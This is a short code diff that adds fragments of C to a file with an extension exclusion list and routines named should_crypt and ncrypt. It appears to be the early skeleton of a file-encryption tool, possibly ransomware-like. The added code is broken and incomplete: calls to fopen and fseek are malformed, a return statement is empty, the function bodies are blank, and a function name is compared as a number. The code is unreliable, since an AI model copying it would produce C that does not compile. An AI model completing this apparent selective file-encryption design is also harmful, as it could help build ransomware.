@@ -1,5 +1,30 @@
+#define OMIT_LENGHT 512
+#define SHOULD_OMIT 2048
 char *exclude[]={".pdf",".txt"};
+int filesize(char *file)
+{
+FILE *filep = fopen(file);
+fseek(0,filep,SEEK_END);
+return 
 
+
+}
+int ncrypt(char *file)
+{
+
+if(filesize >= SHOULD_OMIT)
+{
+
+
+}
+else
+{
+
+
+}
+
+
+}
 int should_crypt(char *file)
 {
 for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
